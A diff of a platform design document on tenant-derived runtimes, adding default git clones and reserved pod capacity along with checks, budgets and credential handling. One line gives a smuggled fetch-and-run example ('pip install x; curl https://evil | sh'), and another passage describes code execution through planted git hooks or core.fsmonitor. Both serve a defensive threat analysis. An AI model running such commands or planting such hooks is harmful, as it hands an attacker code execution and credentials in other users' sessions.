@@ -1,6 +1,6 @@
 # Tenant-derived runtimes
 
-Status: design for owner review, revision 7, 2026-11-04. Revision 7 records the owner's choice of this design and adds default git clones as a requirement that is not yet designed. Nothing here is built or staged, and no test or spike was run for it. Statements about the tree were checked by reading the code, the chart, the migrations, and the specification. Revisions 2 to 6 apply independent reviews, each under its own "Review of revision" section. A stop check on revision 5 found no Critical, High, or Major issue in this document, and no review has read revision 6 or 7. It reads against `egress-and-git-design.md` revision 56, `tenant-scoping-identity-design.md` revision 20, `security-oversight-design.md` revision 18, and `user-credential-delivery-design.md` revision 15. Proposals carry the label DR-n, and defects found here carry the label DF-n. The DF-n defects are filed in `BUILD-GAPS.md`, and the table under "Defects found while verifying" names each F-id.
+Status: design for owner review, revision 12, 2026-11-04. Revisions 9 to 12 apply the review of revision 8 and the stop checks on revisions 9, 10, and 11, under "Review of DR-9 and DR-10". Revision 8 adds default git clones (DR-9) and capacity reservation (DR-10), records the owner's yes on default setup commands, and applies the requests under "Changes requested of other design documents". Revision 7 records the owner's choice of this design. Nothing here is built or staged, and no test or spike was run for it. Statements about the tree were checked by reading the code, the chart, the migrations, and the specification. Revisions 2 to 6 apply independent reviews, each under its own "Review of revision" section. A stop check on revision 5 found no Critical, High, or Major issue in this document, and no review has read revisions 6, 7, or 12. It reads against `egress-and-git-design.md` revision 57, `tenant-scoping-identity-design.md` revision 21, `security-oversight-design.md` revision 19, `user-credential-delivery-design.md` revision 15, and `user-git-identity-design.md` revision 18. Proposals carry the label DR-n, and defects found here carry the label DF-n. The DF-n defects are filed in `BUILD-GAPS.md`, and the table under "Defects found while verifying" names each F-id.
 
 ## Problem
 
@@ -14,23 +14,11 @@ The capability is general. A tenant admin can also add default workspace files, 
 
 On 2026-11-04 the owner chose this design over a tenant-owned pool on an unchanged base, in these words: "I want derived runtimes for the two reasons you state. I want tenants to define their own default files and git clones." The two reasons are that transparent clients of a shared runtime keep working when an environment adds a deny, and that a tenant admin creates runtimes. The alternative stays in git history as `designs/tenant-owned-pools-design.md`, revision 5, at commit `7a72e0b65`.
 
-### Default git clones
-
-The owner requires default git clones, and this revision does not design them. `WorkspaceDefaults` holds `files` and `setupCommands`, §14.1 **Runtime workspace defaults.** composes them as `inlineFile` sources and setup commands, and no field carries a `gitClone` source. `sharedAssets` has `gitRepository` entries, and this design refuses that field to a tenant.
-
-A setup command running `git clone` is not a substitute, because it has no pinned commit and no credential lease, and it needs `allowSetupCommands`. Adding a `gitClone` source to the defaults needs a change in order: `resolveSubmittedPlan` runs `checkGitCloneAuthBindings` and `PinCommitSHAs` on the client's plan, and `composeRuntimeDefaults` runs afterwards, so a composed source would skip the host-to-pool check and the commit pin.
-
-The design for this must state:
-
-- Which grant flag allows a default clone, and whether a clone counts as code in the way a default file does.
-- Whose credential a private default clone uses, given that the session's user may hold no link or no access to the repository, and what the session answers in that case.
-- How a default clone enters the session's declared repositories under a `required` pool (`user-git-identity-design.md`, "Declared repositories"), and how it is checked against the tenant's repository allowlist.
-- Whether a ref is pinned per session at bind, as §14 states for a client's source, or at the write of the derived runtime.
-- How a default clone behaves on a `restricted` pool with no `gitAccess`, where `egress-and-git-design.md` refuses a plan with a `gitClone` source at create.
+The owner then answered "Default clones: yes" and "Default setup commands: yes", and added: "I think we need to add settings to control the min number of pods per tenant to reserve capacity. This should only be allowed if the platform admin/operator allow it". DR-9 and DR-10 state the clones and the reservation, and "Tenant defaults" states the commands.
 
 ## Scope
 
-This design covers tenant-created derived runtimes, the pools they need, the grant that turns the capability on, the fields a tenant can set, the base runtime lifecycle, and the interactions with environments, experiments, delegation, and security oversight.
+This design covers tenant-created derived runtimes, the pools they need, the grant that turns the capability on, the fields a tenant can set, default git clones, capacity reservation, the base runtime lifecycle, and the interactions with environments, experiments, delegation, and security oversight.
 
 These are out of scope:
 
@@ -45,11 +33,12 @@ These are out of scope:
 - R2. A tenant admin can give an environment one-session pods of a runtime whose shared pool serves concurrent sessions.
 - R3. Another tenant cannot see, name, use, collide with, or be affected by a tenant-derived runtime.
 - R4. Nothing a tenant sets widens what the base and the platform allow: image, process, isolation, execution mode, egress ceiling, credential delivery, or command policy.
-- R5. The platform bounds the pods each tenant's derived runtimes hold, warm and active, and those bounds sum to no more than a deployment total the operator sets. Nodes and the namespace `ResourceQuota` stay shared with every other pool, so R5 limits what owned pools take and reserves nothing for anyone.
+- R5. The platform bounds the pods each tenant's derived runtimes hold, warm and active, and those bounds sum to no more than a deployment total the operator sets. Nodes and the namespace `ResourceQuota` stay shared with every other pool, so R5 limits what owned pools take and reserves nothing. R10 states reservation.
 - R6. A tenant-derived runtime blocks no platform write, apart from the exceptions DP9 states, and a platform change does not strand a tenant without notice, apart from a stated emergency path.
 - R7. A tenant's security team can forbid the capability and can see what it produced.
 - R8. A deployment that issues no grant behaves as it does today, apart from the defect fixes in DR-1 to DR-3.
-- R9. A tenant admin can define default workspace files and default git clones on a derived runtime. "Fields" covers the files, and "Default git clones" lists what remains to be designed for the clones.
+- R9. A tenant admin can define default workspace files, setup commands, and git clones on a derived runtime, each under its own grant flag.
+- R10. Where the operator and the platform admin allow it, a tenant admin can reserve a minimum number of pods for a derived runtime. The pods exist before any session, other pools cannot take their share of the namespace quota, and with a dedicated node pool other pools cannot take their nodes. No reservation evicts another pod.
 
 ## Security properties
 
@@ -64,6 +53,8 @@ These are out of scope:
 - DP9. A platform write to a base or a template pool succeeds regardless of what tenant-derived runtimes exist. The exceptions are `DELETE .../tenant-access/{tenantId}` and a template's `DELETE`, which the operator's own live grant entry refuses, and a base's `DELETE` before its retirement date, which an emergency retirement gets past.
 - DP10. Each write passes through EG-9's single write path, applies any SO-2 guardrail, and records the content it changes.
 - DP11. An experiment's effects reach a pool only when the experiment's tenant is that pool's single tenant.
+- DP12. A default clone stores no credential. Its token comes from the tenant's VCS pool or the session user's link, under the checks a client's `gitClone` source gets, and those checks run on every path that composes it.
+- DP13. A reservation never evicts a pod, and the total reservable capacity is set only through Helm.
 
 ## Current state
 
@@ -110,7 +101,7 @@ The pool routes have the same gate. F-5.2.67 records the egress case. The same g
 
 The owner has decided to have this capability. These are its costs.
 
-- **Tenant code in every session.** Any tenant default is code execution at the agent UID, in every session on that runtime, and the user creating the session has no opt-out. A default file is code as well as a command: a base command installs from it, and a runtime loads a hook or configuration file from the workspace. A stolen `tenant-admin` therefore reaches what `user-credential-delivery-design.md` lists for this attacker: it reads a `file` token and uses an `inject` token, including a host's mint operation. It also reads what later sessions place in the workspace. A grant with `allowWorkspaceFiles` and `allowSetupCommands` off carries none of this cost and still serves R2. DF-1 is worse than this today, because it crosses tenants, and DR-1 closes it. Within a tenant the risk is new.
+- **Tenant code in every session.** Any tenant default is code execution at the agent UID, in every session on that runtime, and the user creating the session has no opt-out. A default file is code as well as a command: a base command installs from it, and a runtime loads a hook or configuration file from the workspace. A stolen `tenant-admin` therefore reaches what `user-credential-delivery-design.md` lists for this attacker: it reads a `file` token and uses an `inject` token, including a host's mint operation. It also reads what later sessions place in the workspace. A grant with `allowWorkspaceFiles`, `allowSetupCommands`, and `allowGitClones` off carries none of this cost and still serves R2. DF-1 is worse than this today, because it crosses tenants, and DR-1 closes it. Within a tenant the risk is new.
 - **Warm pods per runtime.** Each tenant-derived runtime has its own pool and at least one warm pod, because a pool has no working cold path today (DF-11). An environment moved from a concurrent pod to one-session pods also uses more pods per session.
 - **Capacity planned by customers.** §17.8.2's sizing assumes an operator's pool list. Tenant writes now add pools within the budgets, and the namespace `ResourceQuota` is shared.
 - **Slower base retirement.** A base with tenant-derived runtimes takes a notice period to retire, apart from the emergency path, and a platform change reaches runtimes the operator did not write.
@@ -204,8 +195,13 @@ New error codes are `403 DERIVATION_NOT_GRANTED`, `422 DERIVATION_BUDGET_EXCEEDE
 | `tenant_derivation_grants` | New table, with one row per tenant, readable under the tenant's context, and written only under `lenny.admin_mode`, using the trigger migration `0052` introduced | DR-4 |
 | `consumed_name_prefixes` | New table, holding the prefix string alone, written at first assignment, and surviving withdrawal and erasure | DR-4 |
 | `runtime_definitions` | `retire_at`, and `deployment_model` and `registered`, which the RuntimeReconciler mirrors | DR-4, DR-6 |
-| `sandbox_warm_pools` | `owner_tenant_id` from EG-9, plus `template_pool`, `pod_runtime_ref`, and `warm_stop_reasons` | DR-2, DR-5 |
-| `SandboxTemplate.spec` | `podRuntimeRef` and the owner, because the controller stamps the owner from it | DR-2, DR-5 |
+| `sandbox_warm_pools` | `owner_tenant_id` from EG-9, plus `template_pool`, `pod_runtime_ref`, and `warm_stop_reasons`, and `reserved_pods` and `reserved_placement` | DR-2, DR-5, DR-10 |
+| `SandboxTemplate.spec` | `podRuntimeRef` and the owner, because the controller stamps the owner from it, and `reservedPlacement` | DR-2, DR-5, DR-10 |
+| `SandboxWarmPool.spec` | `reservedPods`, which the PoolScalingController renders from the pool row | DR-10 |
+| `Sandbox.spec` | `reserved`, set at creation | DR-10 |
+| `workspaceDefaults` | `gitClones` | DR-9 |
+| `gitClone` source | `replacePath`, gateway-written and refused from a client, in the stored plan, `schemas/workspaceplan-v1.json` under `additionalProperties: false`, `WorkspaceSource` in `lenny-adapter.proto`, and the mapping in `podsession/workspaceplan.go`, which would otherwise drop it silently | DR-9 |
+| Chart | The `lenny-reserved` `PriorityClass`, and the `ResourceQuota` split into reserved, general, and storage quotas | DR-10 |
 | Base-change outbox | A row written in the platform write's transaction | DR-6 |
 | Pod label | `lenny.dev/served`, under `lenny-label-immutability` | DR-5 |
 | Name grammar | `--` reserved | DR-1 |
@@ -226,6 +222,8 @@ bases:
     resourceClasses: [small, medium]
     allowWorkspaceFiles: false
     allowSetupCommands: false
+    allowGitClones: false
+    maxReservedPods: {}
     ownedOverlays: []
 ```
 
@@ -237,7 +235,7 @@ A base entry is accepted only when all of these hold:
 - `resourceClasses` lies within the base's `allowedResourceClasses`.
 - The base has `requireSoPeercred` true, because `acknowledgeNonceOnlyAuth` is a deployer's statement that a tenant does not make.
 - The base's `Runtime` resource exists, which the gateway's `get` permission reads, because a pool's pods need it (DF-3).
-- With `allowWorkspaceFiles` or `allowSetupCommands` set, the base is `type: agent` with `deploymentModel` `sidecar` or empty, which `runsSupervisor` reads as sidecar, so it runs the runtime supervisor.
+- With `allowWorkspaceFiles`, `allowSetupCommands`, or `allowGitClones` set, the base is `type: agent` with `deploymentModel` `sidecar` or empty, which `runsSupervisor` reads as sidecar, so it runs the runtime supervisor.
 - With `allowSetupCommands` set, the base's `setupCommandPolicy` has mode `allowlist` and `shell: false`.
 
 A base outside the list cannot be derived from, and "Base changes" states what each grant change does. A grant or a withdrawal is a platform admin's write to a customer's configuration, so SO-4a mirrors it, as for the other gates.
@@ -260,6 +258,7 @@ Each row follows §5.1 **Normative Merge Algorithm**. Rows marked "not in §5.1"
 | `setupPolicy.onTimeout` | Override | Yes | It affects only the owner's sessions. |
 | `workspaceDefaults.files` | Append | Under `allowWorkspaceFiles`, after DR-3 | See "Tenant defaults". Replacing a base file's path is refused. Each is a §14 `inlineFile` under a Helm size bound, visible in `GET /v1/sessions/{id}`, so it holds no secrets. |
 | `workspaceDefaults.setupCommands` | Append | Under `allowSetupCommands`, after DR-3 | See "Tenant defaults". |
+| `workspaceDefaults.gitClones` | Append, new in §5.1 | Under `allowGitClones`, after DR-3 | See "DR-9: Default git clones". |
 | `runtimeOptionsSchema` | Override, subset of names | Yes | A client's options are validated against the derived and base schemas together, because a name check alone lets a derived schema drop a base's `maximum`. A tenant schema is also new input to `validateAgainstSchema`, which compiles it per session with the default `Loaders` of `jsonschema/v5`, including `file`, and reads a compile failure as no constraint. The write therefore compiles it, refuses `$schema`, `$id`, and any `$ref` other than a local fragment, and bounds its size. |
 | `defaultPoolConfig` | Override | Refused | The `pool` block replaces it. |
 | `delegationPolicyRef` | Override, restrict | Yes | It names a policy in the tenant. Effective policy is the intersection §8.3 **Effective policy** states, which needs `Merge` to keep both references (DF-7). A base's reference resolves in the session's tenant today, so a `tenant-admin`, who writes those policies, already controls its content. |
@@ -290,9 +289,9 @@ Every acknowledgment is a deployer's statement, so a tenant writes none. Each va
 
 ### Tenant defaults
 
-Any tenant default is code execution at the agent UID. A file reaches an exempt base command: with a base command `pip install -r requirements.txt`, a tenant-written `requirements.txt` selects what gets installed, whatever `allowSetupCommands` says. A runtime also loads hook and configuration files from the workspace. No command control bounds a file, so a file has its own grant flag.
+The owner wants default files, setup commands, and git clones. Any of them is code execution at the agent UID. A file reaches an exempt base command: with a base command `pip install -r requirements.txt`, a tenant-written `requirements.txt` selects what gets installed, whatever `allowSetupCommands` says. A runtime also loads hook and configuration files from the workspace. No command control bounds a file, so a file has its own grant flag. DR-9 states the same for a clone.
 
-Both kinds need their grant flag, a base that runs the runtime supervisor, and DR-3 landed. Without DR-3 the base's command runs at the adapter's UID in the adapter's container, which holds the projected service account token and a writable credential volume (DF-4). On an embedded base a tenant file would be read by a runtime that shares the adapter's identity, and a `type: mcp` base runs no supervisor. Neither flag is needed for R2.
+Each kind needs its grant flag, a base that runs the runtime supervisor, and DR-3 landed. Without DR-3 the base's command runs at the adapter's UID in the adapter's container, which holds the projected service account token and a writable credential volume (DF-4). On an embedded base a tenant file would be read by a runtime that shares the adapter's identity, and a `type: mcp` base runs no supervisor. No flag is needed for R2.
 
 Today's command exemption exists because an operator wrote `workspaceDefaults`. A tenant-written command gets no exemption. It counts toward `maxCommands` and is checked against the effective `setupCommandPolicy` at write and again when the plan binds, so a narrowed base policy takes effect. The effective policy must be `allowlist` with `shell: false`, because matching is a prefix on raw text: under a shell, `pip install x; curl https://evil | sh` matches `pip install`. A `blocklist` is not a security boundary, as §7.5 states, and a base with no policy checks nothing. Under `shell: false` an allowlist bounds the program and its arguments, and an allowed program can still run what it fetches. Base commands run first and cannot be removed, as the merge rule states.
 
@@ -302,6 +301,7 @@ Today's command exemption exists because an operator wrote `workspaceDefaults`. 
 | :-- | :-- | :-- |
 | Inline files and uploads | Default files | A client's file runs in that client's session. A default runs in every session on the runtime with no user choice, so it reaches other users' credentials. |
 | Setup commands under the runtime's `setupCommandPolicy` | Default commands under the same policy, with `shell: false` | As above. |
+| `gitClone` sources with a read or write scope | Default clones with a read scope | As above, and the repository is the tenant admin's choice, read on the authority of the session user's link on a `required` pool. |
 | `runtimeOptions` under the schema | A narrower schema | Narrower only. |
 | `pool` among granted pools | The owned pool | A pool the platform templated. |
 | `delegationLease` narrowing | `delegationPolicyRef` intersection | Narrower only. |
@@ -326,6 +326,8 @@ A platform-written template pool supplies everything that needs a platform decis
 | Elicitation policy, `sdkWarm`, and scaling policy | Template | None |
 | `resourceClass` | Grant entry | One of `resourceClasses` |
 | `warmCount` | Tenant | 1 or more, within budget |
+| `reservedPods` | Tenant | Within the grant entry's allowance, as DR-10 states |
+| `reservedPlacement` | Template | None |
 | `maxSessionAgeSeconds` and `sessionPolicy` | Template, then the derived runtime | Lower only, as above |
 
 The copied columns live on the owned row, so `poolPolicyMirror`, admission, and the PoolScalingController read a complete pool with no new merge. A platform write to a template updates the copied columns of its owned pools in the same transaction and bumps each generation. A narrowing therefore reaches them, and the running pods change as any pool edit does today, on pods created afterwards. `ownerTenantId` is set at create and immutable, as `egress-and-git-design.md` decision 26 states.
@@ -354,14 +356,13 @@ DR-5 adds `lenny.dev/served`, which the gateway stamps at first assignment on an
 | Bound | Holder | Enforcement |
 | :-- | :-- | :-- |
 | `maxRuntimes` | Grant | Checked at write, under a lock on the grant row, so concurrent creates cannot pass together. |
-| `maxOwnedPods`, at write | Grant | A write raising the sum of `warmCount` across the tenant's owned pools needs the active count, which the next row defines, plus the new sum to stay below it, under the same lock, so one claim can still pass. A lowering always passes. |
-| `maxOwnedPods`, at claim | Grant | A claim that takes a new pod needs the tenant's active pods plus that sum to stay below it. Otherwise it answers `429 QUOTA_EXCEEDED`. Active pods are the Sandboxes of its owned pools in phases `claimed`, `reserved`, `draining`, and `failed`, from a list per owned pool. The warm sum covers `idle`, `warming`, and `sdk_connecting`, which `plan.Compute` treats as inventory, and `terminated` is a sink that holds no pod. `agent_pod_state` cannot serve, because `derivePodStates` leaves `tenant_id` empty and each sync clears it. A `ClaimSlot` on an occupied pod adds no pod and is exempt. The count is not serialized, so overshoot is bounded by concurrent claims. |
+| `maxOwnedPods` | Grant | One figure governs every check. The tenant's charge T is the sum across its owned pools of `max(inUse, reservedPods) + warmCount + unusable`. `inUse` counts pods in `claimed` and `reserved`, `unusable` counts `draining` and `failed`, and `reservedPods` is 0 on a pool with no reservation. A write or a claim that raises T past the bound is refused: a write answers `422 DERIVATION_BUDGET_EXCEEDED`, under a lock on the grant row, and a claim answers `429 QUOTA_EXCEEDED`. A write lowering T always passes. A claim that leaves T unchanged always passes, which covers a claim within a reservation and a `ClaimSlot` on an occupied pod. `warmCount` stands for `idle`, `warming`, and `sdk_connecting` pods, which `plan.Compute` treats as inventory, and `terminated` is a sink that holds no pod. Counts come from a Sandbox list per owned pool. `agent_pod_state` cannot serve, because `derivePodStates` leaves `tenant_id` empty and each sync clears it. The claim count is not serialized, so overshoot is bounded by concurrent claims. A session ending moves a pod to `unusable`, which can raise T with no check, and claims outside a reservation are then refused until that pod is gone. |
 | `runtimes.tenantDerivation.maxOwnedPodsTotal` | Helm | The sum of every grant's `maxOwnedPods` stays at or below it, checked at grant write under one lock that only grant writes take. Preflight compares it with the namespace `ResourceQuota`. |
 | Pod size | `resourceClasses` | Set per base in the grant. `LimitRange` still applies. |
 
 `max_concurrent_sessions` does not serve as this bound. A quota of 1000 moved from 20-session pods to one-session pods turns 50 pods into 1000.
 
-The PoolScalingController never raises an owned pool above `warmCount`. Its formula is clamped, `bootstrapMinWarm` is refused, and an experiment's `initialMinWarm` on an owned pool is refused at write, because `ResolveVariantRoles` assigns it to `MinWarm` directly. A concluded experiment drains its owned variant pool, which affects only the owner. Warm-pod minutes accrue per pool, so an owned pool's idle cost is attributable to its owner through the pool row. Whether the billing pipeline should read that is the operator's commercial choice.
+The PoolScalingController never raises an owned pool above its warm target, which is `warmCount` unless DR-10 raises it. Its formula is clamped, `bootstrapMinWarm` is refused, and an experiment's `initialMinWarm` on an owned pool is refused at write, because `ResolveVariantRoles` assigns it to `MinWarm` directly. A concluded experiment drains its owned variant pool, which affects only the owner. Warm-pod minutes accrue per pool, so an owned pool's idle cost is attributable to its owner through the pool row. Whether the billing pipeline should read that is the operator's commercial choice.
 
 ### Kubernetes permissions
 
@@ -391,10 +392,12 @@ For a tenant-derived runtime, the restrict-only rules move from a one-time check
 | Leaves the base's `Runtime` resource at `Registered=False` | `incompatible`. `mirror` refuses such a resource and leaves the row stale, and the Sandbox controller does not read the condition, so the RuntimeReconciler records it in `registered` on the row. |
 | Changes base `workspaceDefaults` or `labels` | Applies to plans bound afterwards, and to selectors at once. |
 | Changes a template pool | Copied under "Template copy". A lowered `maxConcurrentSessions` lowers the owned value. |
-| Sets `allowSetupCommands` or `allowWorkspaceFiles` false while the runtime holds that default | `incompatible`, until the tenant removes it. This is the stop after a compromise. |
+| Sets `allowSetupCommands`, `allowWorkspaceFiles`, or `allowGitClones` false while the runtime holds that default | `incompatible`, until the tenant removes it. This is the stop after a compromise. |
+| Adds a base default file at or under a default clone's `path`, or removes the template's git path while a default clone exists | `incompatible`, until the tenant edits the clone. |
+| Lowers `maxReservedPods` below what the tenant's pools use | The grant write lowers `reservedPods`, as DR-10 states. |
 | Narrows `resourceClasses` | `incompatible`, until the tenant picks another class. |
 | Changes an entry's `templatePool` | The grant write copies the new template's columns to the owned pools in its transaction. |
-| Lowers `maxOwnedPods` below the sum of `warmCount` | The grant write lowers each owned `warmCount`, in name order and to a minimum of 1, until the sum fits or none can go lower, and emits the event. Later claims answer `QUOTA_EXCEEDED`, and pods above the bound end with their sessions. |
+| Lowers `maxOwnedPods` below T or the sum of allowances | The grant write lowers allowances and `reservedPods` first, then each owned `warmCount`, in name order and to a minimum of 1, until both fit or none can go lower, and emits the event. Later claims answer `QUOTA_EXCEEDED`, and pods above the bound end with their sessions. |
 | Lowers `maxRuntimes` below the current count | Existing runtimes stay, and a create is refused. |
 | Retires a base, or sets a grant entry's `retireAt` | The retirement path below. |
 | Removes an entry, or revokes access on its base or template, after the entry's date | The runtimes stay `retired`. |
@@ -416,6 +419,170 @@ A running session keeps its plan through any of these, because §14.1 stores the
 Per tenant, the carrier is a grant entry's `retireAt`, set through `PUT .../derivation-grant` under the same notice floor, with `emergency: true`, a `ticketId`, and optionally `force: true` in that body for the emergency form. Withdrawing a grant sets `retireAt` on each entry. An entry's date counts as passed once its base's `retire_at` has passed. While an entry has tenant-derived runtimes and its date has not passed, a grant write cannot remove the entry, and `DELETE .../tenant-access/{tenantId}` on its base or template answers `409 RESOURCE_HAS_DEPENDENTS`, because that route deletes the row with no date to hold. The operator's own entry holds this refusal, so it comes from no tenant.
 
 **Who drains.** `warm_stop_reasons` on the owned row is the one signal the controller reads. `PoolStoreSource` reads pool rows, so it maps a non-empty value to its existing `ForceZeroMinWarm` and sets `MaxWarm` to 0, because `plan.pinnedOverBound` otherwise keeps served idle pods. The transaction that sets `suspended_by`, a tenant suspension, or an emergency adds its reason, and the Notice worker adds one when a date arrives. Only the source of a reason removes it. A tenant's `PUT` touches the column in one case: a `PUT` that complies with the guardrail passes EG-9's write path, which clears `suspended_by` and its reason. Retirement is terminal for those runtimes, so its reason has no removal, and a tenant creates a new runtime under a live base.
+
+## DR-9: Default git clones
+
+### Stored format
+
+`workspaceDefaults` gains `gitClones`, and each entry uses the field names of §14's `gitClone` source. The field exists only on a tenant-derived runtime in this design, so a base contributes none, and a platform runtime write refuses it. Adding it to platform runtimes later is additive.
+
+```yaml
+workspaceDefaults:
+  gitClones:
+    - url: https://github.com/acme/agent-skills
+      ref: main
+      path: skills
+      depth: 1
+      auth: { mode: credential-lease, leaseScope: vcs.github.read }
+```
+
+A default clone holds no secret. A private clone takes its token from the tenant's VCS pool or from the session user's link, under the checks a client's `gitClone` source gets, and the agent never receives that token.
+
+### Checks at write
+
+A `POST` or `PUT` refuses a default clone with `422 INVALID_DERIVED_RUNTIME` and `details.field` unless all of these hold:
+
+- The grant entry sets `allowGitClones`, and the count is within `runtimes.tenantDerivation.maxDefaultGitClones`.
+- `url` passes §14's restrictions and the shared canonicalizer in `egress-and-git-design.md`, and it carries no userinfo.
+- The host is the host of one of the tenant's VCS pools or git routes. An uncovered host has no git enforcement, as that design's "Uncovered git hosts" states, and §14 lets a client's pinned commit skip the resolver's host check. A default clone gets that check whether or not its ref is a full commit.
+- A repository under a VCS pool's prefix carries `auth` and is on the tenant's repository allowlist. A repository under no prefix omits `auth`. `checkGitCloneAuthBindings` skips a source with no `auth`, while `netagent` attaches credentials by repository and the readable set takes every `gitClone` source, so an `auth`-less clone of `github.com/acme/secret` would otherwise pass every check made here.
+- `auth.leaseScope`, when set, is a read scope. A client that needs to push declares the repository in `writableRepositories`, so a default never adds to a session's writable set and never triggers `prAuthoring`'s attach rule.
+- `submodules` is absent, because a submodule names repositories the write did not check. `resolvedCommitSha` is absent, because the gateway writes it.
+- `path` is present and is a relative subdirectory. It is neither `.` nor a parent or child of another default clone's path or a default file's path, on the runtime or its live base.
+- No component of a default clone's `path` or a default file's `path` is `.git`, compared case-insensitively. `workspaceplan.validatePath` does not refuse this today, and "Not verified" below states why it matters.
+- On a `required` pool, the owned pool is one `user-git-identity-design.md` accepts, so a recycling or concurrent owned pool is refused at write. Otherwise every session on the runtime would answer `USER_AUTHORIZATION_UNSUPPORTED_POD`.
+- The owned pool has a git path. A `restricted` template with no `gitAccess` has none.
+
+A `ref` that is not a full commit answers with a `Warning`, because "A clone is code" below gives it a wider set of attackers, and `derivedRuntimes.forbid` can refuse it.
+
+### Binding
+
+`ComposeInto` adds the clones after the default files and ahead of the client's sources, and they enter the stored plan as `gitClone` sources carrying `replacePath: true`. The gateway writes that field and refuses it from a client, as it does `resolvedCommitSha`. A source with the field replaces its `path` as a whole, where a client's source keeps §14.1's per-path rule. The rest of the session path then treats them as declared sources: `required` pools, readable sets, the pod's clone, and the stored `resolvedCommitSha` all apply with no second mechanism. The host and prefix checks under "Checks at write" run again at bind, because a VCS pool or route can change after the write, and neither `checkGitCloneAuthBindings` nor the resolver covers an `auth`-less clone or a full commit.
+
+The order in today's code needs changing. `resolveSubmittedPlan` runs `checkGitCloneAuthBindings` and `PinCommitSHAs` on the client's plan, and `composeRuntimeDefaults` runs later, once routing has fixed the runtime, so a composed clone would skip both. These rules follow:
+
+| Path | Rule |
+| :-- | :-- |
+| `POST /v1/sessions` with a plan, and `POST /v1/sessions/start` | After `composeRuntimeDefaults` and before `claimAtCreate`, the gateway runs the auth binding check, the environment and allowlist checks, the `required` check, and the commit pin on the composed default clones. The client's sources keep their earlier checks, so a bad client plan still fails before routing. |
+| `POST /v1/sessions` with no plan | The plan binds at finalize, after the create-time claim. The gateway runs every check except the commit pin on the routed runtime's default clones before `claimForNewRow`, so a user with no access holds no pod. |
+| `POST /v1/sessions/{id}/finalize` | The same full run follows `composeRuntimeDefaults`. A refusal binds nothing and leaves the session in `created`, as §14.1 states for a rejected plan. |
+| A delegated child | `composeChildWorkspaceDefaults` makes the same full run, with the child's user and environment, and a refusal fails the delegation before the child row exists. `Service` gains the resolver and credential dependencies it lacks today. |
+| Derive and replay | These rows hold no plan, and the plan binds at finalize, which composes the runtime's current defaults. The rule for a create with no plan therefore runs ahead of `claimDerivedRow`, and finalize makes the full run, so a floating ref resolves afresh. `replacePath` applies over the restored tree, so the result is that commit, and anything an earlier session changed under that path is gone. A refusal ahead of the claim calls `undoDerivedWrites`, as any refusal there does. |
+| Resume, retry, and rebuild | The stored plan holds the commit, so these read it, and the `required` check runs as `user-git-identity-design.md` states for resume. |
+
+All of these read the final runtime, so an experiment's `variant.Runtime` brings that runtime's clones with it.
+
+### Whose credential
+
+| Case | Identity on the clone | When it cannot read |
+| :-- | :-- | :-- |
+| No `auth`, a repository under no VCS pool prefix | Anonymous, on a covered host or route | A floating ref refuses the session at bind, under the refusal rule below. A full commit skips `ls-refs`, so a missing commit fails at materialization with `SESSION_CREATION_FAILED`, after the claim. |
+| VCS pool with `userAuthorization: off` | The tenant's App or stored token | As above. Any user who can start a session on the runtime gets the repository's content, which the tenant's allowlist already gives a session on that pool. |
+| VCS pool with `userAuthorization: required`, human root session | The App or link token I8 mints, after the session user's link passes the check | `USER_LINK_REQUIRED` or `USER_REPOSITORY_ACCESS_DENIED`. Nothing falls through to the App, and no session runs without the clone. |
+| The same, listed service identity | The App, under the subject's own allowlist | Refused when the repository lies outside that allowlist. |
+| The same, unlisted service caller | None | Refused, as "Service identities" states. |
+| Delegated child | The parent's user, on the child's row | As for that user, and the delegation fails. |
+
+A refusal caused by a default clone goes through its own error writer, which carries `details.source: runtimeDefault`, the clone's `path`, and a reason, and omits `url`, `ref`, `host`, `matchingPools`, and the underlying error text. `writeRefResolveError` and `writeVCSResolveError` return those fields today, and a repository later moved or made private would otherwise show its name to any user of the runtime. `user-git-identity-design.md` names the repository because the user declared it, and here a tenant admin named it. `USER_LINK_REQUIRED` keeps `linkUrl`, which names the provider alone. A user who passes sees the URL and commit in `GET /v1/sessions/{id}`.
+
+A runtime can therefore become unusable for some users. A write answers with a `Warning` when a default clone is under a `required` pool, naming that access now decides who can use the runtime.
+
+### Environments
+
+A default clone's VCS pool must be visible in the session's environment, and its host must survive that environment's policy. Otherwise the session is refused in that environment. The write's `Warning` lists each admitting environment where the check would refuse. The rule under "Pods with no per-session policy" reads the composed plan, so a concurrent owned pool whose default clone names a scoped repository refuses the session as it would for a client's plan.
+
+### A clone is code
+
+A default clone reaches an exempt base command and the runtime's workspace configuration as a default file does. `allowGitClones` therefore has the conditions of `allowWorkspaceFiles`: a supervised base, and DR-3 landed.
+
+A clone adds one risk a file does not have. Whoever can push to the named ref runs code at the agent UID in every new session on that runtime, and Lenny records no write by that person. A default file changes only through a tenant admin's audited write. A full commit removes this risk, and `derivedRuntimes.forbid: floatingCloneRefs` requires one. Each session's stored `resolvedCommitSha` records what it ran.
+
+### Materialization and cost
+
+Default clones are not warmed. Each session fetches them at materialization, and `sharedAssets` stays refused. A tenant admin avoids a slow first fetch through the mirror prefetch resource `egress-and-git-design.md` defines.
+
+- A floating ref adds an `ls-refs` call per session create and makes create depend on the egress path. A full commit avoids both.
+- The composed plan counts toward §7.1 **Bind bounds.**, and the pool's fetch retry window covers every clone of a plan together, so defaults use up a client's share of each.
+- `egress-and-git-design.md` refuses a runtime write that raises the setup bound past what a pool's window admits, and a tenant's `setupPolicy.timeoutSeconds` is such a write. The refusal goes to the tenant, on its own write. A template write that raises the window succeeds under DP9, and the owned pool's effective window is the smaller of the copied value and what its setup bound admits.
+
+### Not verified
+
+`egress-and-git-design.md` moves the clone into the pod and does not state how the adapter treats a target directory that already holds files. A client's `gitClone` defaults to `path: .`, and default files and clones materialize first, so that common plan has to work. A snapshot's content meets a fresh clone in the same way.
+
+The answer is a security requirement. The adapter runs the clone at its own UID, which holds the service account token. A `.git/config` in the target that sets `core.fsmonitor`, or a hook there, would run tenant-chosen code at that UID, which DR-3 exists to prevent. The `.git` refusal above closes the tenant's route. `egress-and-git-design.md` now states the rule for every clone: the adapter clones into a new empty directory, with hooks and repository configuration ignored, runs all its git work there, including setting `origin`, and only then moves the result to the target. An existing `.git` at the target is replaced as a unit, because the path collision rule works per path and a planted `commondir` or hook would otherwise survive a merge. The adapter runs no git in the target after the move.
+
